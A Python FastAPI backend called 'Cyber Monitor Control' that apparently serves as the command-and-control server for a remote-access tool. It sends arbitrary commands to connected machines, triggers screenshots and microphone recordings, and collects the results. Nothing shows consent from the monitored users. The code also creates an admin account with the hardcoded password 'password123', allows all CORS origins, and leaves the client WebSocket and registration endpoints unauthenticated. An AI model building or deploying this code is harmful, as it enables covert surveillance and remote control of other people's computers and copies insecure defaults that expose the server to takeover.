import os
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import List, Dict, Optional, Any
import uvicorn
from datetime import datetime, timedelta
import secrets
import json
from supabase import create_client, Client
from dotenv import load_dotenv
import jwt
import bcrypt
import base64
import asyncio

# Load environment
load_dotenv()

app = FastAPI(
    title="Cyber Monitor Control",
    version="3.0",
    description="Client monitoring and management system"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allow all origins (adjust for production)
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))

# Initialize Supabase
supabase: Optional[Client] = None

# Security
security = HTTPBearer()

# ========== MODELS ==========
class LoginRequest(BaseModel):
    email: str
    password: str

class ClientRegister(BaseModel):
    client_id: str
    name: str
    ip_address: str
    os_info: str = "Windows"

class CommandRequest(BaseModel):
    client_id: str
    command: str
    parameters: Dict = {}

class LogEntry(BaseModel):
    client_id: str
    log_type: str
    message: str

class AudioUpload(BaseModel):
    client_id: str
    audio_data: str  # base64 encoded
    filename: str

class ScreenshotUpload(BaseModel):
    client_id: str
    image_data: str  # base64 encoded
    filename: str

# ========== SECURITY FUNCTIONS ==========
def hash_password(password: str) -> str:
    """Hash password using bcrypt"""
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_password(plain_password: str, hashed_password: str) -> bool:
    """Verify password"""
    try:
        return bcrypt.checkpw(plain_password.encode(), hashed_password.encode())
    except:
        return False

def create_jwt_token(data: dict, expires_delta: timedelta = None):
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str):
    """Verify JWT token"""
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=["HS256"])
        return payload
    except jwt.PyJWTError:
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Verify JWT token from request"""
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid authentication credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

# ========== DATABASE INITIALIZATION ==========
@app.on_event("startup")
async def startup_event():
    """Initialize database on startup"""
    global supabase
    
    try:
        if not SUPABASE_URL or not SUPABASE_KEY:
            print("⚠️  Supabase credentials not set")
            return
        
        print(f"🔗 Initializing Supabase connection...")
        supabase_client = create_client(SUPABASE_URL, SUPABASE_KEY)
        
        # Test connection
        try:
            response = supabase_client.table("users").select("count", count="exact").limit(1).execute()
            print(f"✅ Database connected: {len(response.data)} users found")
            
            # Check if admin user exists, create if not
            admin_email = "admin@system.io"
            admin_res = supabase_client.table("users").select("*").eq("email", admin_email).execute()
            
            if not admin_res.data:
                hashed_pw = hash_password("password123")
                supabase_client.table("users").insert({
                    "email": admin_email,
                    "password_hash": hashed_pw,
                    "is_admin": True,
                    "is_active": True,
                    "created_at": datetime.utcnow().isoformat()
                }).execute()
                print(f"✅ Created admin user: {admin_email}")
            
        except Exception as e:
            print(f"❌ Database test failed: {str(e)}")
            print("💡 Make sure you've created the tables in Supabase")
            return
        
        supabase = supabase_client
        
    except Exception as e:
        print(f"❌ Startup error: {str(e)}")
        import traceback
        traceback.print_exc()

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = []

    async def connect_admin(self, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections.append(websocket)

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        
        # Notify admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat()
        })

    def disconnect(self, websocket: WebSocket):
        # Remove from admin connections
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)
        
        # Remove from client connections
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            # Notify admins
            asyncio.create_task(self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat()
            }))

    async def notify_admins(self, message: dict):
        """Send message to all admin connections"""
        disconnected = []
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except:
                disconnected.append(connection)
        
        # Remove disconnected admins
        for connection in disconnected:
            if connection in self.admin_connections:
                self.admin_connections.remove(connection)

    async def send_to_client(self, client_id: str, message: dict):
        """Send message to specific client"""
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except:
                # Remove disconnected client
                if client_id in self.client_connections:
                    del self.client_connections[client_id]
                return False
        return False

manager = ConnectionManager()

# ========== ROUTES ==========
@app.post("/api/login")
async def login(data: LoginRequest):
    """Login endpoint"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Check if user exists
        response = supabase.table("users") \
            .select("*") \
            .eq("email", data.email) \
            .execute()
        
        if not response.data:
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        user = response.data[0]
        
        # Verify password
        if not verify_password(data.password, user["password_hash"]):
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        # Check if user is active
        if not user.get("is_active", True):
            raise HTTPException(status_code=401, detail="Account disabled")
        
        # Create JWT token
        token_data = {
            "sub": user["email"],
            "email": user["email"],
            "is_admin": user.get("is_admin", False),
            "user_id": str(user["id"])
        }
        access_token = create_jwt_token(token_data)
        
        # Update last login
        try:
            supabase.table("users") \
                .update({"last_login": datetime.utcnow().isoformat()}) \
                .eq("id", user["id"]) \
                .execute()
        except:
            pass
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user["email"],
                "is_admin": user.get("is_admin", False)
            }
        }
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Login error: {str(e)}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client")
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Get client IP from request
        if not data.ip_address or data.ip_address == "127.0.0.1":
            data.ip_address = request.client.host if request.client else "Unknown"
        
        # Check if client exists
        response = supabase.table("clients") \
            .select("*") \
            .eq("client_id", data.client_id) \
            .execute()
        
        client_data = {
            "client_id": data.client_id,
            "name": data.name,
            "ip_address": data.ip_address,
            "os_info": data.os_info,
            "last_seen": datetime.utcnow().isoformat(),
            "online": True,
            "registered_at": datetime.utcnow().isoformat()
        }
        
        if response.data:
            # Update existing client
            supabase.table("clients") \
                .update(client_data) \
                .eq("client_id", data.client_id) \
                .execute()
            client_id = response.data[0]["id"]
        else:
            # Create new client
            insert_response = supabase.table("clients") \
                .insert(client_data) \
                .execute()
            client_id = insert_response.data[0]["id"]
        
        # Add log entry
        try:
            supabase.table("logs").insert({
                "client_id": client_id,
                "log_type": "info",
                "message": f"Client registered: {data.name} ({data.client_id})",
                "created_at": datetime.utcnow().isoformat()
            }).execute()
        except Exception as e:
            print(f"Log insertion error: {str(e)}")
        
        return {
            "success": True, 
            "message": "Client registered",
            "client_id": data.client_id
        }
        
    except Exception as e:
        print(f"Client registration error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/clients")
async def get_clients(_: dict = Depends(authenticate_user)):
    """Get all clients"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        response = supabase.table("clients") \
            .select("*") \
            .order("last_seen", desc=True) \
            .execute()
        
        return {"success": True, "clients": response.data}
    except Exception as e:
        print(f"Get clients error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/client/{client_id}")
async def get_client(client_id: str, _: dict = Depends(authenticate_user)):
    """Get specific client"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        response = supabase.table("clients") \
            .select("*") \
            .eq("client_id", client_id) \
            .execute()
        
        if not response.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        return {"success": True, "client": response.data[0]}
    except HTTPException:
        raise
    except Exception as e:
        print(f"Get client error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/commands")
async def get_commands(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 50
):
    """Get recent commands"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        query = supabase.table("commands") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        response = query.execute()
        return {"success": True, "commands": response.data}
    except Exception as e:
        print(f"Get commands error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/screenshots")
async def get_screenshots(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 12
):
    """Get recent screenshots"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        query = supabase.table("screenshots") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        response = query.execute()
        return {"success": True, "screenshots": response.data}
    except Exception as e:
        print(f"Get screenshots error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/audio")
async def get_audio(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    limit: int = 10
):
    """Get recent audio recordings"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        query = supabase.table("audio_recordings") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        response = query.execute()
        return {"success": True, "audio_recordings": response.data}
    except Exception as e:
        print(f"Get audio error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/logs")
async def get_logs(
    _: dict = Depends(authenticate_user),
    client_id: Optional[str] = None,
    log_type: Optional[str] = None,
    limit: int = 100
):
    """Get system logs"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        query = supabase.table("logs") \
            .select("*, clients(client_id, name)") \
            .order("created_at", desc=True) \
            .limit(limit)
        
        if client_id:
            client_res = supabase.table("clients") \
                .select("id") \
                .eq("client_id", client_id) \
                .execute()
            if client_res.data:
                query = query.eq("client_id", client_res.data[0]["id"])
        
        if log_type and log_type != "all":
            query = query.eq("log_type", log_type)
        
        response = query.execute()
        return {"success": True, "logs": response.data}
    except Exception as e:
        print(f"Get logs error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/command")
async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Get client ID
        client_res = supabase.table("clients") \
            .select("id") \
            .eq("client_id", data.client_id) \
            .execute()
        
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Create command record
        command_res = supabase.table("commands").insert({
            "client_id": client_res.data[0]["id"],
            "command": data.command,
            "parameters": data.parameters,
            "status": "pending",
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        command_id = command_res.data[0]["id"]
        
        # Try to send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": command_id,
            "command": data.command,
            "parameters": data.parameters
        })
        
        if not sent:
            # Update command status if WebSocket failed
            supabase.table("commands") \
                .update({"status": "failed", "error": "Client not connected"}) \
                .eq("id", command_id) \
                .execute()
        
        return {
            "success": True,
            "command_id": command_id,
            "sent_via_websocket": sent
        }
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Send command error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/screenshot/{client_id}")
async def request_screenshot(client_id: str, _: dict = Depends(authenticate_user)):
    """Request screenshot from client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "screenshot_request"
        })
        
        if sent:
            return {
                "success": True,
                "message": "Screenshot request sent"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload-screenshot")
async def upload_screenshot(data: ScreenshotUpload, _: dict = Depends(authenticate_user)):
    """Upload screenshot from client"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Get client ID
        client_res = supabase.table("clients") \
            .select("id") \
            .eq("client_id", data.client_id) \
            .execute()
        
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Store screenshot
        screenshot_res = supabase.table("screenshots").insert({
            "client_id": client_res.data[0]["id"],
            "image_data": data.image_data,
            "filename": data.filename,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        # Notify admins
        await manager.notify_admins({
            "type": "screenshot_received",
            "client_id": data.client_id,
            "screenshot_id": screenshot_res.data[0]["id"],
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {"success": True, "screenshot_id": screenshot_res.data[0]["id"]}
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Screenshot upload error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/upload-audio")
async def upload_audio(data: AudioUpload, _: dict = Depends(authenticate_user)):
    """Upload audio recording from client"""
    try:
        if supabase is None:
            raise HTTPException(status_code=500, detail="Database not initialized")
        
        # Get client ID
        client_res = supabase.table("clients") \
            .select("id") \
            .eq("client_id", data.client_id) \
            .execute()
        
        if not client_res.data:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Store audio
        audio_res = supabase.table("audio_recordings").insert({
            "client_id": client_res.data[0]["id"],
            "audio_data": data.audio_data,
            "filename": data.filename,
            "created_at": datetime.utcnow().isoformat()
        }).execute()
        
        # Notify admins
        await manager.notify_admins({
            "type": "audio_received",
            "client_id": data.client_id,
            "audio_id": audio_res.data[0]["id"],
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {"success": True, "audio_id": audio_res.data[0]["id"]}
        
    except HTTPException:
        raise
    except Exception as e:
        print(f"Audio upload error: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/audio/{client_id}/record")
async def record_audio(client_id: str, duration: int = 10, _: dict = Depends(authenticate_user)):
    """Request audio recording from client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "audio_record",
            "duration": duration
        })
        
        if sent:
            return {
                "success": True,
                "message": f"Audio recording requested for {duration} seconds"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/audio/{client_id}/stop")
async def stop_audio(client_id: str, _: dict = Depends(authenticate_user)):
    """Stop audio recording on client"""
    try:
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "audio_stop"
        })
        
        if sent:
            return {
                "success": True,
                "message": "Audio recording stopped"
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
            
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    await manager.connect_admin(websocket)
    try:
        while True:
            data = await websocket.receive_json()
            # Handle admin messages if needed
            print(f"Admin WebSocket message: {data}")
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        print(f"Admin WebSocket error: {str(e)}")
        manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await manager.connect_client(websocket, client_id)
    try:
        # Update client status
        if supabase:
            try:
                supabase.table("clients").update({
                    "online": True,
                    "last_seen": datetime.utcnow().isoformat()
                }).eq("client_id", client_id).execute()
            except Exception as e:
                print(f"Client status update error: {e}")
        
        while True:
            data = await websocket.receive_json()
            data_type = data.get("type")
            
            if data_type == "heartbeat":
                # Update last seen
                if supabase:
                    try:
                        supabase.table("clients").update({
                            "last_seen": datetime.utcnow().isoformat(),
                            "online": True
                        }).eq("client_id", client_id).execute()
                    except:
                        pass
                
            elif data_type == "command_result":
                # Update command status
                if supabase:
                    try:
                        supabase.table("commands").update({
                            "status": "completed",
                            "result": data.get("result"),
                            "completed_at": datetime.utcnow().isoformat()
                        }).eq("id", data.get("command_id")).execute()
                    except:
                        pass
                
                # Notify admins
                await manager.notify_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "command_id": data.get("command_id"),
                    "result": data.get("result"),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "log":
                # Store log
                if supabase:
                    try:
                        client_res = supabase.table("clients") \
                            .select("id") \
                            .eq("client_id", client_id) \
                            .execute()
                        if client_res.data:
                            supabase.table("logs").insert({
                                "client_id": client_res.data[0]["id"],
                                "log_type": data.get("log_type", "info"),
                                "message": data.get("message", ""),
                                "created_at": datetime.utcnow().isoformat()
                            }).execute()
                    except:
                        pass
                
                # Notify admins
                await manager.notify_admins({
                    "type": "client_log",
                    "client_id": client_id,
                    "log_type": data.get("log_type", "info"),
                    "message": data.get("message", ""),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "system_info":
                # Store system info
                if supabase:
                    try:
                        client_res = supabase.table("clients") \
                            .select("id") \
                            .eq("client_id", client_id) \
                            .execute()
                        if client_res.data:
                            supabase.table("system_info").insert({
                                "client_id": client_res.data[0]["id"],
                                "info": data.get("info", {}),
                                "created_at": datetime.utcnow().isoformat()
                            }).execute()
                    except:
                        pass
                
                # Notify admins
                await manager.notify_admins({
                    "type": "system_info",
                    "client_id": client_id,
                    "info": data.get("info", {}),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
    except WebSocketDisconnect:
        # Mark client as offline
        if supabase:
            try:
                supabase.table("clients").update({
                    "online": False
                }).eq("client_id", client_id).execute()
            except:
                pass
        manager.disconnect(websocket)
    except Exception as e:
        print(f"Client WebSocket error: {str(e)}")
        # Mark client as offline
        if supabase:
            try:
                supabase.table("clients").update({
                    "online": False
                }).eq("client_id", client_id).execute()
            except:
                pass
        manager.disconnect(websocket)

# ========== HEALTH AND INFO ==========
@app.get("/api/health")
async def health_check():
    """Health check endpoint"""
    health_status = {
        "status": "healthy" if supabase else "unhealthy",
        "timestamp": datetime.utcnow().isoformat(),
        "version": "3.0",
        "database": "connected" if supabase else "disconnected",
        "active_clients": len(manager.client_connections),
        "active_admins": len(manager.admin_connections)
    }
    
    # Test database connection
    if supabase:
        try:
            supabase.table("users").select("count", count="exact").limit(1).execute()
            health_status["database"] = "connected"
        except Exception as e:
            health_status["database"] = f"error: {str(e)}"
            health_status["status"] = "degraded"
    
    return health_status

@app.get("/")
async def root():
    return {
        "message": "Cyber Monitor Control API",
        "version": "3.0",
        "status": "running",
        "database": "connected" if supabase else "disconnected",
        "endpoints": {
            "login": "POST /api/login",
            "register_client": "POST /api/register-client",
            "clients": "GET /api/clients",
            "commands": "GET /api/commands",
            "screenshots": "GET /api/screenshots",
            "audio": "GET /api/audio",
            "logs": "GET /api/logs",
            "health": "GET /api/health"
        },
        "websocket": {
            "admin": "/ws/admin",
            "client": "/ws/client/{client_id}"
        }
    }

# ========== MAIN ==========
if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    print(f"🚀 Starting Cyber Monitor Control API")
    print(f"📡 Port: {port}")
    print(f"🔗 Supabase: {'Connected' if supabase else 'Disconnected'}")
    print(f"👥 Active clients: 0")
    print(f"💻 Admin panel: http://localhost:{port}")
    print("\n📋 Available endpoints:")
    print(f"   • API Root: GET /")
    print(f"   • Health: GET /api/health")
    print(f"   • Login: POST /api/login")
    print(f"   • Register client: POST /api/register-client")
    print(f"   • Docs: http://localhost:{port}/docs")
    
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=port,
        log_level="info"
    )
